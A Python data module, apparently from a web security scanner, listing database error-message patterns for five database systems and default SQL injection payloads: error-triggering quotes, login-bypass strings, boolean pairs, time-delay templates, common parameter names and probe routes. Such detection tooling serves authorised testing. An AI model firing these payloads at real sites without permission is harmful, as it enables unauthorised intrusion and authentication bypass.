"""SQL injection detection data: DBMS error signatures and default payloads."""
from __future__ import annotations

import re
from typing import Dict, List, Set, Tuple


DBMS_ERROR_SIGNATURES: Dict[str, List[Tuple[str, re.Pattern]]] = {
    "mysql": [
        ("mysql_syntax_error", re.compile(r"You have an error in your SQL syntax", re.IGNORECASE)),
        ("mysql_version_manual", re.compile(r"check the manual that corresponds to your (?:MySQL|MariaDB) server version", re.IGNORECASE)),
        ("mysql_client_error", re.compile(r"\bMySqlClient\.", re.IGNORECASE)),
        ("mysql_jdbc_error", re.compile(r"com\.mysql\.jdbc\.exceptions", re.IGNORECASE)),
        ("mysql_syntax_exception", re.compile(r"\bMySQLSyntaxErrorException\b", re.IGNORECASE)),
        ("mysql_valid_result", re.compile(r"valid MySQL result", re.IGNORECASE)),
        ("mysql_unknown_column", re.compile(r"Unknown column '[^']+' in '(?:where clause|field list|order clause)'", re.IGNORECASE)),
        ("mysql_table_not_found", re.compile(r"Table '[^']+' doesn't exist", re.IGNORECASE)),
    ],
    "postgresql": [
        ("postgres_error", re.compile(r"PostgreSQL.*ERROR", re.IGNORECASE)),
        ("postgres_query_failed", re.compile(r"pg_query\(\): Query failed:", re.IGNORECASE)),
        ("postgres_exec_failed", re.compile(r"pg_exec\(\): Query failed:", re.IGNORECASE)),
        ("postgres_psql_exception", re.compile(r"org\.postgresql\.util\.PSQLException", re.IGNORECASE)),
        ("postgres_psql_exception_short", re.compile(r"\bPSQLException\b", re.IGNORECASE)),
        ("postgres_syntax_near", re.compile(r"ERROR:\s+syntax error at or near", re.IGNORECASE)),
        ("postgres_column_missing", re.compile(r"ERROR:\s+column \"[^\"]+\" does not exist", re.IGNORECASE)),
        ("postgres_relation_missing", re.compile(r"ERROR:\s+relation \"[^\"]+\" does not exist", re.IGNORECASE)),
        ("postgres_aborted_transaction", re.compile(r"current transaction is aborted, commands ignored until end of transaction block", re.IGNORECASE)),
    ],
    "mssql": [
        ("mssql_driver_error", re.compile(r"Driver.*SQL[-_ ]Server", re.IGNORECASE)),
        ("mssql_oledb_error", re.compile(r"OLE DB.*SQL Server", re.IGNORECASE)),
        ("mssql_jdbc_driver", re.compile(r"\bSQLServer JDBC Driver\b", re.IGNORECASE)),
        ("mssql_unclosed_quote", re.compile(r"Unclosed quotation mark (?:after|before) the character string", re.IGNORECASE)),
        ("mssql_odbc_driver", re.compile(r"\[Microsoft\]\[ODBC SQL Server Driver\]", re.IGNORECASE)),
        ("mssql_server_tag", re.compile(r"\[SQL Server\]", re.IGNORECASE)),
        ("mssql_syntax_near", re.compile(r"Incorrect syntax near", re.IGNORECASE)),
        ("mssql_conversion_failed", re.compile(r"Conversion failed when converting the varchar value", re.IGNORECASE)),
    ],
    "oracle": [
        ("oracle_ora_code", re.compile(r"\bORA-[0-9]{5}\b")),
        ("oracle_error_tag", re.compile(r"Oracle error", re.IGNORECASE)),
        ("oracle_driver_error", re.compile(r"Oracle.*Driver", re.IGNORECASE)),
        ("oracle_quoted_string", re.compile(r"quoted string not properly terminated", re.IGNORECASE)),
        ("oracle_command_not_ended", re.compile(r"SQL command not properly ended", re.IGNORECASE)),
    ],
    "sqlite": [
        ("sqlite_jdbc_driver", re.compile(r"SQLite/JDBCDriver", re.IGNORECASE)),
        ("sqlite_exception", re.compile(r"SQLite\.Exception", re.IGNORECASE)),
        ("sqlite_operational_error", re.compile(r"sqlite3\.OperationalError", re.IGNORECASE)),
        ("sqlite_error_tag", re.compile(r"\bSQLITE_ERROR\b")),
        ("sqlite_syntax_near", re.compile(r"near \"[^\"]*\": syntax error", re.IGNORECASE)),
        ("sqlite_unrecognized_token", re.compile(r"unrecognized token:", re.IGNORECASE)),
    ],
}

# Base Payloads
DEFAULT_ERROR_PAYLOADS: List[str] = [
    "'",
    "\"",
    "\\'",
    "\\\"",
    "')",
    "\")",
    "1'",
    "1\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "1' AND 1=CONVERT(int, (SELECT @@version))--",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(0)))a)--",
    "1' AND 1=CAST((SELECT version()) AS INT)--",
    "1' AND ctxsys.drithsx.sn(1, (SELECT banner FROM v$version WHERE rownum=1))--",
    "1' AND 1=CAST((SELECT sqlite_version()) AS INT)--",
    "1 ORDER BY 1--",
    "1 ORDER BY 9999--",
]

DEFAULT_BOOLEAN_PAIRS: List[Tuple[str, str]] = [
    ("' OR 1=1--", "' OR 1=2--"),
    ("' OR '1'='1", "' OR '1'='2"),
    ("' OR 'a'='a", "' OR 'a'='b"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1 AND 1=1--", "1 AND 1=2--"),
    ("') OR ('1'='1", "') OR ('1'='2"),
    ("\" OR 1=1--", "\" OR 1=2--"),
    ("\" OR \"1\"=\"1", "\" OR \"1\"=\"2"),
    ("' OR 1=1#", "' OR 1=2#"),
    ("' OR 1=1/*", "' OR 1=2/*"),
]

DEFAULT_TIME_PAYLOADS_TEMPLATE: List[str] = [
    "' OR SLEEP({delay})--",
    "1' OR SLEEP({delay})--",
    "'; SELECT SLEEP({delay});--",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP({delay})))a)--",
    "'; SELECT pg_sleep({delay});--",
    "1' AND (SELECT 1 FROM (SELECT(pg_sleep({delay})))a)--",
    "' OR pg_sleep({delay})--",
    "'; WAITFOR DELAY '0:0:{delay}'--",
    "1'; WAITFOR DELAY '0:0:{delay}'--",
    "' WAITFOR DELAY '0:0:{delay}'--",
    "1' AND 1=dbms_pipe.receive_message('RDS', {delay})--",
    "1' AND 1=dbms_lock.sleep({delay})--",
]

COMMON_SQL_PARAMS: Set[str] = {
    "id", "user", "username", "password", "email", "search", "q", "query",
    "cat", "category", "item", "page", "sort", "filter", "name", "view",
    "order", "dir", "limit", "offset", "key", "token", "code", "file",
    "product", "role", "group", "type", "lang", "ref", "target", "account",
}

DEFAULT_SQLI_PROBE_ROUTES: List[str] = [
    "/search",
    "/api/search",
    "/login",
    "/api/login",
    "/api/v1/users",
    "/api/users",
    "/item",
    "/products",
    "/items",
    "/user",
]

